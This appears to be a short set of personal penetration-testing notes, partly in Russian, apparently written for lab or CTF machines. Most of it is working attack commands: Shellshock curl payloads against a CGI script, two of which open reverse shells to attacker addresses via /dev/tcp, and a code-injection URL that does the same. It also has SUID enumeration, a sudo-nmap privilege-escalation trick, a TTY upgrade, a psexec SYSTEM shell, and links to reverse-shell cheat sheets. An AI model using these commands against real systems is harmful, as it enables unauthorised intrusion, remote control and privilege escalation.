curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh




curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&1" http://10.8.0.10/cgi-bin/shell.sh


http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}


Sudo -l
find hacker -exec whoami \;
find / -perm -u=s -type f 2>/dev/null

 TF=$(mktemp) 
 echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

https://gtfobins.github.io/  повышение привелегий через судо-приложения


https://github.com/rebootuser/LinEnum
реверс
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell



реверс генератор


https://www.revshells.com/




Также вы можете загрузить zip-файл с RustHound https://github.com/OPENCYBER-FR/RustHound/archive/master.zip


повысить до tty командой 
python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/bash -p - это команда запуска интерпретатора командной строки Bash с флагом -p, который означает "privileged mode" (привилегированный режим).


Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим...
